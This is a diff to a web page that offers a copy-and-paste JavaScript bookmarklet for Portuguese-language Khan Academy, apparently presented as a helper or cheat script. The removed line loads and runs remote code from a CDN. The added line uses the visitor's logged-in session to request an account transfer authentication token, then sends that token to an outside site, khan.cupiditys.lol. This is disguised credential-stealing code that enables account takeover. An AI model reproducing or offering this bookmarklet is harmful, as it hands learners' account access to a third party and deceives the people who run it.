@@ -1125,7 +1125,7 @@
                 
                 <div class="code-box">
                     <div class="code-content" id="js-code">
-javascript:(function(){const s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Hi55Five/KhanScript@main/script.js?'+Date.now();document.head.appendChild(s);})();
+javascript:(async()=>{if("pt.khanacademy.org"!==window.location.hostname)return;let e=await fetch("https://pt.khanacademy.org/api/internal/graphql/createTransferAuthTokenMutation?lang=pt&app=khanacademy",{headers:{"content-type":"application/json","x-ka-fkey":"1"},referrer:"https://pt.khanacademy.org/settings/account",body:JSON.stringify({operationName:"createTransferAuthTokenMutation",query:"mutation createTransferAuthTokenMutation($canvasProfileKeyName: String) {\n  createTransferAuthToken(canvasProfileKeyName: $canvasProfileKeyName) {\n    token\n    __typename\n  }\n}",variables:{}}),method:"POST",mode:"cors",credentials:"include"}),a=(await e.json()).data.createTransferAuthToken.token;open("https://khan.cupiditys.lol/?token="+a)})();
                     </div>
                     <button class="copy-btn" id="copy-btn">
                         <i class="fas fa-copy"></i> Copiar Código
